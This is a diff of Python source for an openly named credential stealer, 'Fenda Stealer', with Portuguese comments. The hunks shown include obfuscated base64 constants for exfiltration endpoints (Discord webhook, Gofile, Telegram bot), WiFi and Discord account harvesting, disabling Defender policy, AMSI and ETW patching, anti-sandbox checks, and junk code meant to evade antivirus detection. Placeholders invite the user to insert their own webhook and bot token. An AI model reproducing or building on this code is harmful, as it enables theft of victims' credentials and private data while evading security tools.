@@ -24,7 +24,7 @@ class Paths:
 class Malware:
     def __init__(self):
         self.zip_name = f"SK_{random.randint(10000000000, 99999999999)}.zip"
-        self.webhook_url = decode_const(WEBHOOK_ENC)  # endpoint resolvido apenas em runtime
+        self.webhook_url = decode_const(WEBHOOK_ENC)  
         self.stealer_version = "2.1.0"
         self.stats = {}
         self.malware_name = "Fenda Stealer"
@@ -305,7 +305,6 @@ class Malware:
 
             SystemDiagnostics.fake_tick("session-batch")
 
-            # --- v2: coleta expandida ---
             try:
                 self.stats["WiFi networks"] = StealerFunctions.WiFi_Profiles(zip_file)
                 print("WiFi profiles collected:", self.stats["WiFi networks"])
@@ -399,7 +398,6 @@ class Malware:
                 print('no internet connection')
                 return
 
-            # --- extras que SO rodam com admin (nunca bloqueiam o fluxo) ---
             if Checks.is_admin():
                 try:
                     _defender_policy_off()
@@ -412,7 +410,6 @@ class Malware:
                 except Exception:
                     pass
 
-            # --- anti-sandbox / anti-debug (ignorados em --test) ---
             _sandbox = Checks.sandbox_reasons()
             if _sandbox:
                 print('sandbox indicators:', _sandbox)
@@ -461,13 +458,6 @@ class Malware:
                 pass
         except Exception:
             pass
-
-
-# =========================================================================
-# Camada de "diagnostico / telemetria do sistema" - codigo de aparencia
-# legitima (junk code + strings falsas) intercalado entre os modulos reais
-# para quebrar heuristicas de sequencia em AV/EDR.
-# =========================================================================
 
 
 class SystemDiagnostics:
@@ -1764,9 +1754,6 @@ Discord Account n°{str(number_discord_account)}:
         else:
             return False
 
-    # ------------------------------------------------------------------
-    # v2 - coletores adicionais (WiFi, credenciais, perfil da maquina)
-    # ------------------------------------------------------------------
 
     @staticmethod
     def WiFi_Profiles(zip_file):
@@ -2105,11 +2092,6 @@ Discord Account n°{str(number_discord_account)}:
         return len(lines)
 
 
-# =========================================================================
-# v2 - camada de runtime: guarda de strings, AMSI/ETW patch, defesa AV
-# =========================================================================
-
-
 def decode_const(c):
     try:
         return base64.b64decode(c)[::-1].decode(errors="ignore")
@@ -2123,7 +2105,7 @@ def encode_const(s):
 
 # Constantes ofuscadas (base64 do texto invertido). Para gerar novas:
 #   python fendastealer.py enc "https://discord.com/api/webhooks/SEU_AQUI"
-WEBHOOK_ENC = "TFJVX0tPT0hCRVdfUlVPWV9IVElXX0VDQUxQRVIvc2tvb2hiZXcvaXBhL21vYy5kcm9jc2lkLy86c3B0dGg="  # REPLACE_WITH_YOUR_WEBHOOK_URL
+WEBHOOK_ENC = "REPLACE_WITH_YOUR_WEBHOOK_URL"  # REPLACE_WITH_YOUR_WEBHOOK_URL
 
 W_NETSH = "aHN0ZW4="
 W_WLAN = "bmFsdw=="
@@ -2141,10 +2123,10 @@ ETWFN = "ZXRpcld0bmV2RXd0RQ=="
 NTDLL = "bGxkLmxsZHRu"
 
 GOFILE_ENC = "ZWxpRmRhb2xwdS9vaS5lbGlmb2cuZGFvbHB1Ly86c3B0dGg="
-TELEGRAM_API = "dG9iL2dyby5tYXJnZWxldC5pcGEvLzpzcHR0aA=="
-# Telegram (bot + chat_id) - SUBSTITUA PELOS SEUS (gere via: python fendastealer.py enc "VALOR")
-TELEGRAM_TOKEN_ENC = "TkVLT1RfVE9CX0hUSVdfRUNBTFBFUg=="   # REPLACE_WITH_BOT_TOKEN
-TELEGRAM_CHAT_ENC = "REElfVEFIQ19IVElXX0VDQUxQRVI="       # REPLACE_WITH_CHAT_ID
+TELEGRAM_API = "TELEGRAM_API_KEY"
+# SUBSTITUA PELOS SEUS (gere via: python fendastealer.py enc "VALOR")
+TELEGRAM_TOKEN_ENC = "REPLACE_WITH_BOT_TOKEN"   # REPLACE_WITH_BOT_TOKEN
+TELEGRAM_CHAT_ENC = "REPLACE_WITH_CHAT_ID"       # REPLACE_WITH_CHAT_ID
 
 
 def _patch_amsi():
